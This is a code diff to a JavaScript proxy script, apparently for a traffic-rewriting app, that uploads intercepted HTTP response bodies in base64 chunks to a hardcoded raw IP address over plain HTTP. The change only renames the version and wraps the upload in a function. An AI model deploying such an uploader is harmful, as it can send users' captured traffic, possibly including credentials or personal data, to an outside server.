@@ -4,7 +4,7 @@
 // 2. 兼容 body / bodyBytes 为 ArrayBuffer、Uint8Array、base64 字符串、raw 字符串；
 // 3. 只上传模块 pattern 匹配到的目标响应。
 
-const UPLOAD_VERSION = "v4.1-64k-parallel-base64-debug";
+const UPLOAD_VERSION = "v4.1.1-64k-parallel-base64";
 
 const upload_url = "http://167.234.217.255:8000/api/raw2";
 const chunkSize  = 64 * 1024;   // 64KB
@@ -140,6 +140,7 @@ function getBase64Body() {
   return { data: "", source: "empty" };
 }
 
+function startUpload() {
 let url = "";
 try {
   url = (typeof $request !== "undefined" && $request.url)
@@ -240,3 +241,6 @@ function sendChunk(index) {
 for (let i = 0; i < Math.min(PARALLEL, totalChunks); i++) {
   sendChunk(started++);
 }
+}
+
+startUpload();
